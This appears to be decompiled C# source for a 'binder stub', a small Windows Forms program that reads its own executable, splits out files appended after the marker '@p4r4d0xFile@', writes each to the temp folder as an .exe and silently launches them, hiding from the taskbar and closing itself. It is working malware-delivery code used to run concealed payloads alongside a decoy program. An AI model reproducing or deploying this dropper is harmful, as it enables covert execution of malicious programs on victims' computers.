using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Binder_Stub;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	private string filesplitter;

	private string stub;

	private string[] files;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		filesplitter = "@p4r4d0xFile@";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(379, 250);
		((Form)this).set_ClientSize(clientSize);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Form)this).set_TransparencyKey(Color.FromArgb(224, 224, 224));
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)(-1), -1);
		checked
		{
			stub = Strings.Space((int)FileSystem.LOF(1));
			FileSystem.FileGet(1, ref stub, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			files = Strings.Split(stub, filesplitter, -1, (CompareMethod)0);
			int num = Information.UBound((Array)files, 1) - 1;
			for (int i = 1; i <= num; i++)
			{
				FileSystem.FileOpen(1, Environment.GetEnvironmentVariable("temp") + "\\p4r4d0xTemp" + Conversions.ToString(i) + ".exe", (OpenMode)32, (OpenAccess)2, (OpenShare)(-1), -1);
				FileSystem.FilePut(1, files[i], -1L, false);
				FileSystem.FileClose(new int[1] { 1 });
			}
			int num2 = Information.UBound((Array)files, 1) - 1;
			for (int j = 1; j <= num2; j++)
			{
				Process.Start(Environment.GetEnvironmentVariable("temp") + "\\p4r4d0xTemp" + Conversions.ToString(j) + ".exe");
			}
			((Form)this).Close();
		}
	}
}
